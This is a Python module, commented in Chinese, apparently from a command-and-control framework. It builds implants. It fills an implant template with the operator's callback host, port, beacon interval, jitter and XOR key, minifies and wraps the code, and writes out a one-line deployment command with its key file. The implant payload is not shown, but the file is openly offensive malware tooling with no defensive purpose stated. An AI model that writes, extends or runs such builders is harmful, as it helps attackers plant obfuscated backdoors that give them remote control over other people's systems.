"""
@module: build
@desc: 生成 implant 单行部署命令
@params: host port [key_hex] [interval] [jitter] [out_dir]
"""
import json
import os

from server.core.bootstrap import deploy_command
from server.implant.names import minify

MODULE = {
    "desc": "生成 implant 单行部署命令",
    "params": [
        ("host", "必填"),
        ("port", "必填"),
        ("key_hex", "可选；缺省自动从 server/config.json 读取 implant_key"),
        ("interval", "默认 60"),
        ("jitter", "默认 0.2"),
        ("out_dir", "默认 s_modules/output"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_IMPLANT_TEMPLATE = os.path.join(_SERVER_DIR, "implant",
                                 "implant_template.py")
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")


def _read_implant_key() -> bytes:
    """从 server/config.json 读取 implant_key（build 自动读取，T6.1）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None):
    """生成部署命令并写出文件。

    key_hex 未传时自动从 server/config.json 读取 implant_key；
    缺失/无效 → 返回错误（提示先 s_exec keygen）。
    """
    port = int(port)
    interval = int(interval)
    jitter = float(jitter)

    key = None
    if key_hex:
        try:
            key = bytes.fromhex(key_hex)
        except ValueError:
            return {"status": "error",
                    "message": "key_hex 不是合法 hex"}
        if len(key) != 32:
            # M7：长度不符 → implant 端 _K 错误，握手必失败
            return {"status": "error",
                    "message": f"key_hex 长度错误（{len(key)} 字节，"
                               f"需要 32 字节 / 64 hex 字符）"}
    else:
        key = _read_implant_key()
        if key is None:
            return {
                "status": "error",
                "message": "config.json 无有效 implant_key。"
                           "请先 s_exec keygen，或显式传 key_hex。",
            }

    try:
        with open(_IMPLANT_TEMPLATE, "r", encoding="utf-8") as f:
            template = f.read()
    except OSError as e:
        return {"status": "error", "message": f"template read failed: {e}"}

    rendered = template
    rendered = rendered.replace("{{HOST}}", host)
    rendered = rendered.replace("{{PORT}}", str(port))
    rendered = rendered.replace("{{INTERVAL}}", str(interval))
    rendered = rendered.replace("{{JITTER}}", str(jitter))
    rendered = rendered.replace("{{XOR_KEY_BYTES}}", str(list(key)))
    rendered = minify(rendered)  # 可读源码 → 短名产物（D2 契约构建期压缩）

    command = deploy_command(rendered)  # 部署壳用随机单字节 k，与通信密钥无关

    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)
    key_path = os.path.join(out_dir, "xor_key.hex")
    cmd_path = os.path.join(out_dir, "implant_command.txt")
    with open(key_path, "w", encoding="utf-8") as f:
        f.write(key.hex() + "\n")
    with open(cmd_path, "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "key": key.hex(),
        "files": {"xor_key": key_path, "command": cmd_path},
        "deploy": command,
    }


if __name__ == "__main__":
    print("usage: s_exec build <host> <port> [key_hex] [interval] [jitter]")
